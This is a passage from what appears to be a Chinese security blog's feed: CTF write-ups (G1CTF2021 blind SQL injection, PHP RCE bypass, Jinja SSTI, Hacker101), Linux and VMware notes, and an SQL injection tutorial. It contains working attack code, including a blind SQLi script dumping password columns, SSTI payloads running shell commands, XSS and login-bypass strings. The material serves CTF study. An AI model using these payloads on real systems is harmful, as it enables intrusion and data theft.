<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">length() 函数 返回字符串的长度</span><br><span class="line"></span><br><span class="line">substr() 截取字符串 （语法:SUBSTR(str,pos,len);） </span><br><span class="line"></span><br><span class="line">ascii() 返回字符的ascii码   [将字符变为数字wei]</span><br><span class="line"></span><br><span class="line">sleep() 将程序挂起一段时间n为n秒</span><br><span class="line"></span><br><span class="line">if(expr1,expr2,expr3) 判断语句 如果第一个语句正确就执行第二个语句如果错误执行第三个语句	</span><br></pre></td></tr></table></figure>

<p><strong>burp Fuzz</strong>一下</p>
<p>Sql fuzz字典地址: <a href="https://github.com/TheKingOfDuck/fuzzDicts/blob/master/sqlDict/sql.txt">https://github.com/TheKingOfDuck/fuzzDicts </a></p>
<p>里面<a href="https://github.com/TheKingOfDuck/fuzzDicts/tree/master/sqlDict">sqlDict</a>文件夹里面的<strong>sql.txt</strong></p>
<p><img src="https://image.3001.net/images/20210529/1622273460_60b1edb4cbb7e0e17c533.png!small" alt="1622273460_60b1edb4cbb7e0e17c533.png!small"></p>
<p>符号202的表示过滤了</p>
<p>过滤了  <strong>空格,substr,and,||</strong></p>
<p>用 <strong>mid绕substr，or 绕and， /**/绕空格</strong></p>
<p>上脚本用2分法效率高:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">import requests</span><br><span class="line">import urllib.parse</span><br><span class="line">def sqlinjet(url,payload):</span><br><span class="line">    header=&#123;</span><br><span class="line">        &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36&#x27;,</span><br><span class="line">        &#x27;Cookie&#x27;: &quot;session=1ac6a561-26db-4c79-a123-a064f3bdec2b.13jA8tDgWvoOxZN007VHA3-AXsw&quot;,</span><br><span class="line">        &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;</span><br><span class="line">            &#125;</span><br><span class="line">    flag=&#x27;&#x27;</span><br><span class="line">    for i in range(1,200):</span><br><span class="line">        low = 32</span><br><span class="line">        high = 128</span><br><span class="line">        mid = (low + high) // 2</span><br><span class="line">        while(low &lt; high):</span><br><span class="line">            data = &#123;</span><br><span class="line">                &#x27;id&#x27;: payload.format(i,mid),</span><br><span class="line">            &#125;</span><br><span class="line">            r = requests.post(url=url,data=data,headers=header)</span><br><span class="line">            print(data)</span><br><span class="line">            if &#x27;search success&#x27; in r.text:</span><br><span class="line">               low = mid + 1</span><br><span class="line">            else:</span><br><span class="line">               high = mid</span><br><span class="line">            mid = (low + high) // 2</span><br><span class="line">        flag += chr(mid)</span><br><span class="line">        print(flag)</span><br><span class="line">        if mid == 32 or mid == 132:</span><br><span class="line">            break</span><br><span class="line">url=&#x27;http://10.1.5.252:28002/index.php&#x27;</span><br><span class="line">#查所有的库</span><br><span class="line">payload_all_database=&quot;-1/**/or/**/ascii(mid((select/**/group_concat(schema_name)/**/from/**/information_schema.schemata),&#123;&#125;,1))&gt;&#123;&#125;&quot;</span><br><span class="line">#查当前的库</span><br><span class="line">payload_database=&quot;-1/**/or/**/ascii(mid((select/**/database()),&#123;&#125;,1))&gt;&#123;&#125;&quot;</span><br><span class="line">#查表</span><br><span class="line">payload_table=&quot;-1/**/or/**/ascii(mid((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database()),&#123;&#125;,1))&gt;&#123;&#125;&quot;</span><br><span class="line">#emails,flag,referers,uagents,users</span><br><span class="line">#查列</span><br><span class="line">payload_column=&quot;-1/**/or/**/ascii(mid((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=&#x27;users&#x27;),&#123;&#125;,1))&gt;&#123;&#125;&quot;</span><br><span class="line">#id,username,password,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS</span><br><span class="line">#查字段值</span><br><span class="line">flag=&quot;-1/**/or/**/ascii(mid((select/**/group_concat(password)/**/from/**/users),&#123;&#125;,1))&gt;&#123;&#125;&quot;</span><br><span class="line">sqlinjet(url,flag)</span><br></pre></td></tr></table></figure>

<p>得<strong>flag:</strong></p>
<p> <img src="https://image.3001.net/images/20210529/1622275797_60b1f6d5670e17370daae.png!small" alt="1622275797_60b1f6d5670e17370daae.png!small"></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>G1CTF2021</tag>
      </tags>
  </entry>
  <entry>
    <title>G1CTF2021 i_want_to_rce</title>
    <url>/2021/07/05/G1CTF2021-i-want-to-rce/</url>
    <content><![CDATA[<p>访问网址显示内容如下:</p>
<p><img src="https://image.3001.net/images/20210527/1622098597_60af42a5e19348b39f48e.png!small?1622098595141" alt="1622098597_60af42a5e19348b39f48e.png!small?1622098595141"></p>
<span id="more"></span>

<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>代码如下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(!isset($_GET[&#x27;code&#x27;]))&#123;                          #code参数highlight_file(__FILE__);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    $code = $_GET[&#x27;code&#x27;];</span><br><span class="line">    if(preg_match(&quot;/[A-Za-z0-9_$]+/&quot;,$code))&#123;       #绕过正则die(&#x27;fighting!&#x27;); </span><br><span class="line">    &#125;</span><br><span class="line">    system($code);                                  #输出flag&#125;主要考查PHP代码审计和绕过规则</span><br></pre></td></tr></table></figure>

<p>该题和津门杯hate_php很类似</p>
<!--more-->

<p><img src="https://image.3001.net/images/20210527/1622101436_60af4dbc80464fb8d6649.png!small?1622101433438" alt="1622101436_60af4dbc80464fb8d6649.png!small?1622101433438"></p>
<p>不同的地方就是函数<strong>eval(),system()</strong></p>
<p><strong>eval类型函数是代码执行     system类型函数是命令执行 不需要闭合</strong></p>
<p>绕过原理:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload:?code=.%20/???/????????[@-[]</span><br></pre></td></tr></table></figure>

<p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html</a></p>
<p><img src="https://image.3001.net/images/20210527/1622100937_60af4bc97bd26df61ae01.png!small?1622100934463" alt="1622100937_60af4bc97bd26df61ae01.png!small?1622100934463"></p>
<p>该题的PHP版本是<strong>5.6</strong></p>
<h2 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h2><p>1.打开本地服务器phpStudy</p>
<p>2.在根目录下一般是  <strong>\phpStudy\WWW</strong> 创建一个 <strong>.txt</strong>文件</p>
<p>写一个文件上传php代码  然后改成 <strong>.html</strong>文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="line">    &lt;title&gt;POST数据包POC&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=&quot;http://10.1.5.252:2333/&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">&lt;!--链接是当前打开的题目链接--&gt;</span><br><span class="line">    &lt;label for=&quot;file&quot;&gt;文件名：&lt;/label&gt;</span><br><span class="line">    &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot;&gt;&lt;br&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;提交&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20210527/1622102539_60af520b70721eba5d00d.png!small?1622102536372" alt="1622102539_60af520b70721eba5d00d.png!small?1622102536372"></p>
<p>上传一个 <strong>.txt</strong>文件写上</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">ls</span><br></pre></td></tr></table></figure>

<p>3.抓返回包</p>
<p><img src="https://image.3001.net/images/20210527/1622102973_60af53bde7b5ad0275597.png!small?1622102971022" alt="1622102973_60af53bde7b5ad0275597.png!small?1622102971022"></p>
<p>然后**cat,**得到flag</p>
<p> <img src="https://image.3001.net/images/20210527/1622103092_60af54349b3c4f8de178a.png!small?1622103089727" alt="1622103092_60af54349b3c4f8de178a.png!small?1622103089727"></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>G1CTF2021</tag>
      </tags>
  </entry>
  <entry>
    <title>G1CTF2021 SSTI</title>
    <url>/2021/07/05/G1CTF2021-SSTI/</url>
    <content><![CDATA[<p>访问网址显示内容如下:</p>
<p><img src="https://image.3001.net/images/20210530/1622374633_60b378e9207daea38504d.png!small" alt="1622374633_60b378e9207daea38504d.png!small"></p>
<p>输入49发现回显了49</p>
<span id="more"></span>

<p><img src="https://image.3001.net/images/20210530/1622374776_60b37978dc3104735bc4d.png!small" alt="1622374776_60b37978dc3104735bc4d.png!small"></p>
<p><strong>模板注入 。</strong></p>
<p>模板注入解析:  <a href="https://xz.aliyun.com/t/7746">https://xz.aliyun.com/t/7746</a></p>
<p>这里就不多解释了直接上payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;%if%20c.__name__==&#x27;catch_warnings&#x27;%27&#x27;%&#125;</span><br><span class="line">&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls /&#x27;).read()&quot;)&#125;&#125;</span><br><span class="line">&#123;%endif%&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20210530/1622376727_60b381170a65dc8580eb0.png!small" alt="1622376727_60b381170a65dc8580eb0.png!small"></p>
<p>测试可知<strong>过滤flag</strong>,命令执行绕过得FLAG:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;%if%20c.__name__==&#x27;catch_warnings&#x27;%27&#x27;%&#125;</span><br><span class="line">&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /fla&#x27;&#x27;g&#x27;).read()&quot;)&#125;&#125;</span><br><span class="line">&#123;%endif%&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>G1CTF2021</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux系统文件的结构</title>
    <url>/2021/07/05/Linux%E7%B3%BB%E7%BB%9F%E6%96%87%E4%BB%B6%E7%9A%84%E7%BB%93%E6%9E%84/</url>
    <content><![CDATA[<h2 id="文件路径"><a href="#文件路径" class="headerlink" title="文件路径"></a>文件路径</h2><h3 id="绝对路径"><a href="#绝对路径" class="headerlink" title="绝对路径"></a>绝对路径</h3><p>   文件在硬盘上<strong>真正存在</strong>的路径。</p>
<p>​     如:/etc/init/  (看到/开头就是liunx的绝对路径了)</p>
<p>​        C:\Users\Admin.android\avd （看到盘符就绝对是WINDOWS绝对路径了)</p>
<h3 id="相对路径"><a href="#相对路径" class="headerlink" title="相对路径"></a>相对路径</h3><span id="more"></span>

<p>   自己相对与目标位置。</p>
<p>假设 你要引入文件的页面名称为test.htm,它存在叫www的文件夹里（绝对路径D:/wamp/www/test.htm）</p>
<p>那么引用同时存在www文件夹里的“icon.jpg”文件（绝对路径D:/wamp/www/icon.jpg)</p>
<p>同一目录下相对路径icon.jpg （./icon.jpg  ../）</p>
<p>如果文件“icon.jpg”存在img文文件夹中（绝对路径D:/wamp/www/img/icon.jpg),那么相对路径./img/icon.jpg。</p>
<h2 id="查看系统文件目录"><a href="#查看系统文件目录" class="headerlink" title="查看系统文件目录"></a>查看系统文件目录</h2><p>登录系统后在命令窗输入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls /</span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20210525/1621945396_60acec34a72df81d3def8.png!small?1621945395271" alt="1621945396_60acec34a72df81d3def8.png!small?1621945395271"></p>
<p>树形结构图</p>
<p><img src="https://image.3001.net/images/20210525/1621945418_60acec4a3ccfce64ffbde.png!small?1621945416855" alt="1621945418_60acec4a3ccfce64ffbde.png!small?1621945416855"></p>
<h3 id="主要目录解析："><a href="#主要目录解析：" class="headerlink" title="主要目录解析："></a>主要目录解析：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1./bin基础系统所需要的命令位于此目录，例如:ls, mount,cp, mkdir等等；这个目录中的文件都是可执行的，一般的用户都可以使用。2./boot包含Linux内核及系统引导程序所需要的文件,包括连接文件以及镜像文件。</span><br><span class="line"></span><br><span class="line">3./dev设备文件存储目录,这些不是常规文件,而是指系统上的各种硬件设备,包括硬盘驱动器</span><br><span class="line"></span><br><span class="line">4./etc存放系统程序或者一般工具的配置文件,配置文件会影响系统所有用户的系统环境。</span><br><span class="line"></span><br><span class="line">5./home普通用户默认存放目录 Linux 是多用户环境，所以每一个用户都有一个只有自己可以访问的目录（当然管理员也可以访问）。</span><br><span class="line"></span><br><span class="line">6./lib库文件存放目录这里包含了系统程序所需要的所有共享库文件,其作用类似于Windows里的DLL文件。</span><br><span class="line"></span><br><span class="line">7./lost+found：一般情况下为空的，系统非法关机后，这里就存放一些文件</span><br><span class="line"></span><br><span class="line">8./media即插即用型存储设备的挂载点自动在这个目录下创建</span><br><span class="line"></span><br><span class="line">9./mnt这个目录一般是用于存放挂载储存设备的挂载目录的</span><br><span class="line"></span><br><span class="line">10./opt表示的是可选择的意思，有些软件包也会被安装在这里，也就是自定义软件包。这个 目录包含所有默认系统安装之外的软件和添加的包。</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>Kali linux</tag>
      </tags>
  </entry>
  <entry>
    <title>VMware无法上网问题</title>
    <url>/2021/07/05/VMware%E6%97%A0%E6%B3%95%E4%B8%8A%E7%BD%91%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>VM虚拟机<strong>没有网络</strong>几乎啥 啥都弄不了,现在让我们一起来<strong>解决</strong>这个问题叭！！！</p>
<h2 id="判断能否上网的方法"><a href="#判断能否上网的方法" class="headerlink" title="判断能否上网的方法"></a>判断能否上网的方法</h2><span id="more"></span>

<p>1.直接在看<strong>网络管理器小程序</strong>一般在虚拟机的<strong>右上角</strong>:</p>
<p>(鼠标<strong>轻轻放在上面</strong>就能看到有无网络连接)</p>
<p><img src="https://image.3001.net/images/20210531/1622463590_60b4d466256ad79ba924e.png!small?1622463590222" alt="1622463590_60b4d466256ad79ba924e.png!small?1622463590222"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2.ping baidu.com</span><br><span class="line">3.ping 8.8.8.8(是Google提供的免费DNS服务器的IP地址)</span><br><span class="line">4.ping 网关</span><br></pre></td></tr></table></figure>

<h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><p>1）:点击左上角的”编辑”选中”虚拟网络编辑器”;</p>
<p>2）:点击”更改设置”获得管理员的权限来修改网络配置;</p>
<p><img src="https://image.3001.net/images/20210531/1622465225_60b4dac90eab69f727680.png!small?1622465225002" alt="1622465225_60b4dac90eab69f727680.png!small?1622465225002"></p>
<p>3）:单击左下角的”还原默认设置“;</p>
<p><img src="https://image.3001.net/images/20210531/1622467402_60b4e34a8c4319d0ba32c.png!small?1622467402405" alt="1622467402_60b4e34a8c4319d0ba32c.png!small?1622467402405"></p>
<p>4）:在在自定义中选中<strong>VMnet1</strong>/<strong>VMnet8</strong>或<strong>其他的模式</strong>；</p>
<p><img src="https://image.3001.net/images/20210531/1622467491_60b4e3a363b7c457fb60e.png!small?1622467491292" alt="1622467491_60b4e3a363b7c457fb60e.png!small?1622467491292"></p>
<p>5）:”<strong>确定</strong>“后，<strong>开启</strong>虚拟机就有网络了。。</p>
<blockquote>
<p>注:   若执行完以上步骤网络没通的话,就得用以下的方法来解决问题了</p>
</blockquote>
<p>1）:进入设置选中“<strong>桥接模式</strong>”在选中“<strong>复制物理网络</strong>”</p>
<p><img src="https://image.3001.net/images/20210531/1622468436_60b4e754c64074e90eef0.png!small?1622468436845" alt="1622468436_60b4e754c64074e90eef0.png!small?1622468436845"></p>
<p>2）:<strong>开机</strong></p>
<p><strong>总结</strong>:<strong>一般的自定义里面显示的什么方式,选择对应的方式即可上网。</strong></p>
]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>Kali linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Hacker101 CTF Writeup</title>
    <url>/2021/07/10/Hacker101-CTF-Writeup/</url>
    <content><![CDATA[<h2 id="Hacker101-CTF-背景"><a href="#Hacker101-CTF-背景" class="headerlink" title="Hacker101 CTF 背景"></a>Hacker101 CTF 背景</h2><p>Hacker101 CTF是一款旨在让您在安全、有益的环境中学习黑客攻击的游戏。 <a href="https://www.hacker101.com/">Hacker101</a>是一个免费的黑客教育网站，由<a href="https://www.hackerone.com/">HackerOne 运营</a>。</p>
<p>Hacker101 CTF 分为不同的级别，每个级别都包含一定数量的标志。你可以按照你想要的任何顺序来玩关卡。</p>
<span id="more"></span>

<h2 id="A-little-something-to-get-you-started"><a href="#A-little-something-to-get-you-started" class="headerlink" title="A little something to get you started"></a>A little something to get you started</h2><p>访问网址显示内容如下:</p>
<p><img src="https://image.3001.net/images/20210530/1622370828_60b36a0cb8315b49ecdd2.png!small?1622370828394" alt="1622370828_60b36a0cb8315b49ecdd2.png!small?1622370828394"></p>
<p>查看源码,找到一张图片</p>
<p><img src="https://image.3001.net/images/20210530/1622370882_60b36a424c12ea9f01f57.png!small?1622370881966" alt="1622370882_60b36a424c12ea9f01f57.png!small?1622370881966"></p>
<p>访问这张图得到标志FLAG</p>
<p><img src="https://image.3001.net/images/20210530/1622371176_60b36b68e486793b25919.png!small?1622371176510" alt="1622371176_60b36b68e486793b25919.png!small?1622371176510"></p>
<h2 id="Micro-CMS-v1"><a href="#Micro-CMS-v1" class="headerlink" title="Micro-CMS v1"></a><strong>Micro-CMS v1</strong></h2><p>访问网址显示内容如下:</p>
<p><img src="https://image.3001.net/images/20210531/1622458562_60b4c0c21334a21cb19ee.png!small?1622458561975" alt="1622458562_60b4c0c21334a21cb19ee.png!small?1622458561975"></p>
<h3 id="FLAG-0"><a href="#FLAG-0" class="headerlink" title="FLAG 0"></a>FLAG 0</h3><p>进入<strong>编辑页面</strong></p>
<p><img src="https://image.3001.net/images/20210531/1622458723_60b4c1638352794da181f.png!small?1622458723433" alt="1622458723_60b4c1638352794da181f.png!small?1622458723433"></p>
<p>修改ID<strong>值</strong>得到FLAG: (注:ID值可能不一样,1-9试一下就好啦)</p>
<p><img src="https://image.3001.net/images/20210531/1622459000_60b4c278180fc95a6a9b4.png!small?1622459000027" alt="1622459000_60b4c278180fc95a6a9b4.png!small?1622459000027"></p>
<h3 id="FLAG1"><a href="#FLAG1" class="headerlink" title="FLAG1"></a>FLAG1</h3><p>在编辑页面测试<strong>SQL注入漏洞</strong>时,在 URL 中添加<strong>引号</strong>得到了FALG:</p>
<p><img src="https://image.3001.net/images/20210531/1622459562_60b4c4aad5312383c2588.png!small?1622459562807" alt="1622459562_60b4c4aad5312383c2588.png!small?1622459562807"></p>
<h3 id="FLAG2"><a href="#FLAG2" class="headerlink" title="FLAG2"></a><strong>FLAG2</strong></h3><p>存储型 XSS 漏洞,在编辑页面的标题和内容里插入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert`xss`&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20210531/1622460398_60b4c7ee062f6b3e1db31.png!small?1622460397989" alt="1622460398_60b4c7ee062f6b3e1db31.png!small?1622460397989"></p>
<p>Save 然后<strong>go home</strong>会有<strong>弹窗</strong>FLAG</p>
<p><img src="https://image.3001.net/images/20210531/1622460693_60b4c9150bdb22300e275.png!small?1622460692984" alt="1622460693_60b4c9150bdb22300e275.png!small?1622460692984"></p>
<h3 id="FLAG3"><a href="#FLAG3" class="headerlink" title="FLAG3"></a>FLAG3</h3><p>在编辑页面的框里填</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;button onclick=alert(1)&gt;Some button&lt;/button&gt;</span><br></pre></td></tr></table></figure>

<p>：<img src="https://image.3001.net/images/20210531/1622460960_60b4ca20a1d24cac4f9e2.png!small?1622460960589" alt="1622460960_60b4ca20a1d24cac4f9e2.png!small?1622460960589"></p>
<p>然后在检查源码得到FLAG:</p>
<p><img src="https://image.3001.net/images/20210531/1622461372_60b4cbbc4ab7df1f41a59.png!small?1622461372250" alt="1622461372_60b4cbbc4ab7df1f41a59.png!small?1622461372250"></p>
<h2 id="Micro-CMS-v2"><a href="#Micro-CMS-v2" class="headerlink" title="Micro-CMS v2"></a>Micro-CMS v2</h2><h3 id="FLAG0-》绕过登录"><a href="#FLAG0-》绕过登录" class="headerlink" title="FLAG0==》绕过登录"></a>FLAG0==》绕过登录</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">用户名：&#x27; UNION SELECT &#x27;123&#x27; AS password#</span><br><span class="line">密码：     123</span><br><span class="line">SELECT password FROM admins WHERE username = &#x27; admin &#x27;  UNION  SELECT  &#x27; 123 &#x27;  AS password #</span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20210602/1622638893_60b7812d004809a6591af.png!small?1622638892676" alt="1622638893_60b7812d004809a6591af.png!small?1622638892676"></p>
<h3 id="FLAG1-》POST传参"><a href="#FLAG1-》POST传参" class="headerlink" title="FLAG1==》POST传参"></a>FLAG1==》POST传参</h3><blockquote>
<p><strong>退出登录</strong>，直接编辑页面 即后面加 去掉home加page/edit/1,然后以POST传参URL</p>
<p>工具 <strong>hackbar</strong></p>
</blockquote>
<p><img src="https://image.3001.net/images/20210602/1622640468_60b7875485d38c4859109.png!small?1622640468203" alt="1622640468_60b7875485d38c4859109.png!small?1622640468203"></p>
<h3 id="FLAG2-》密码爆破"><a href="#FLAG2-》密码爆破" class="headerlink" title="FLAG2==》密码爆破"></a>FLAG2==》密码爆破</h3><p><strong>万能密码</strong>绕过用户名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; or 1=1#</span><br></pre></td></tr></table></figure>

<p><strong>burp爆破密码</strong>(注：每个人的密码不相同哦)</p>
<p><img src="https://image.3001.net/images/20210602/1622641074_60b789b22dc631e15b050.png!small?1622641074344" alt="1622641074_60b789b22dc631e15b050.png!small?1622641074344"></p>
<h2 id="Encrypted-Pastebin"><a href="#Encrypted-Pastebin" class="headerlink" title="Encrypted Pastebin"></a>Encrypted Pastebin</h2><h3 id="FLAG0"><a href="#FLAG0" class="headerlink" title="FLAG0"></a><strong>FLAG0</strong></h3><p>1.先尝试POST传参</p>
<p><img src="https://image.3001.net/images/20210611/1623409412_60c34304561d67a867af7.png!small?1623409410794" alt="1623409412_60c34304561d67a867af7.png!small?1623409410794"></p>
<p><img src="https://image.3001.net/images/20210611/1623409423_60c3430fa570b171dde6e.png!small?1623409422106" alt="1623409423_60c3430fa570b171dde6e.png!small?1623409422106"></p>
<p>   <strong>看到URL上有个Post传参，然后进行注入测试,没想到得到个FLAG</strong><img src="https://image.3001.net/images/20210611/1623409995_60c3454b60285b2dc5e2b.png!small?1623409993852" alt="1623409995_60c3454b60285b2dc5e2b.png!small?1623409993852"></p>
]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>Hacker101 CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL注入原理分析</title>
    <url>/2021/07/13/SQL%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86/</url>
    <content><![CDATA[<h2 id="SQL注入的本质"><a href="#SQL注入的本质" class="headerlink" title="SQL注入的本质"></a>SQL注入的本质</h2><blockquote>
<p>注入攻击的<strong>本质: 把用户输入的数据当做代码执行</strong>。</p>
<p>两个关键条件：</p>
<p>第一个是用户能够控制输入</p>
<p>第二个是原本程序要执行的代码，拼接了用户输入的数据然后进行执行</p>
</blockquote>
<p>针对<strong>SQL语句的注入</strong>，也可以理解为用户输入的数据当做<strong>SQL语句的代码执行</strong></p>
<span id="more"></span>

<h2 id="显错注入-联合查询（Mysql数据库）的基本流程"><a href="#显错注入-联合查询（Mysql数据库）的基本流程" class="headerlink" title="显错注入-联合查询（Mysql数据库）的基本流程"></a>显错注入-联合查询（Mysql数据库）的基本流程</h2><p><img src="https://image.3001.net/images/20210609/1623234067_60c0961324ec42331fc35.png!small?1623234067968" alt="1623234067_60c0961324ec42331fc35.png!small?1623234067968"></p>
<blockquote>
<p>重要知识点: <strong>通过系统自带库查询数据</strong></p>
<p>通过系统自带库查询数据 Mysql在5.0以上版本加入了<strong>information_schema</strong> 这个系统自带库</p>
<p>其中保存着关于MySQL服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表栏的数据类型与访问权限等</p>
<p><strong>information_schema.tables</strong>存放表名和库名的对应</p>
<p><strong>information_schema.columns</strong>存放字段名和表名的对应</p>
<p><strong>注： 【information_schema.tables 实际上是选中information_schema库中的tables表】</strong></p>
</blockquote>
<h2 id="显错注入靶场的做法"><a href="#显错注入靶场的做法" class="headerlink" title="显错注入靶场的做法"></a>显错注入靶场的做法</h2><p><strong>1.判断注入点</strong></p>
<blockquote>
<p>最古老的方法：    and 1=1 页面正常    and 1=2  页面不正常</p>
<p>最简单的方法：    页面后面加’,看是否报错</p>
<p>好用的方法：      如果是数字型传参，可以尝试-1</p>
<p>例如：   <a href="http://www.xxx.com/new.php?id=1">http://www.xxx.com/new.php?id=1</a>  页面显示id=1的新闻</p>
<p><a href="http://www.xxx.com/new.php?id=2-1">http://www.xxx.com/new.php?id=2-1</a>  页面显示id=1的新闻</p>
<p>and 1=1 and 1=2 被拦截的可能性太高了</p>
<p>可以尝试 and -1=-1 and -1=-2 and 1&gt;0  or 1=1</p>
<p>或者直接 or sleep(5)</p>
<p><strong>2. 判断当前页面字段总数</strong></p>
<p>and 1=1 order by 1,2,3,4,5……</p>
<p><strong>3.判断显示位</strong> </p>
<p>and 1=2 union select 1,2,3,4,5,6,7……</p>
<p><strong>4.查当前数据库</strong> </p>
<p>and 1=2 union select 1,2,database()</p>
<p><strong>5.查表名</strong> </p>
<p>and 1=2 union select 1,2,table_name from information_schema.tables where table_schema=database() limit 0,1</p>
<p><strong>6.查列名</strong> </p>
<p>and 1=2 union select 1,2,column_name from information_schema.columns where table_name=表名 and table_schema=database() limit 0,1</p>
<p><strong>7.查字段内容</strong> </p>
<p>and 1=2 union select 1,字段名,字段名 from 表名 limit 0,1</p>
<p><strong>注：</strong>函数<strong>GROUP_CONCAT</strong>将多行数据进行整合在一行输出</p>
</blockquote>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>渗透测试学习</tag>
      </tags>
  </entry>
</search>
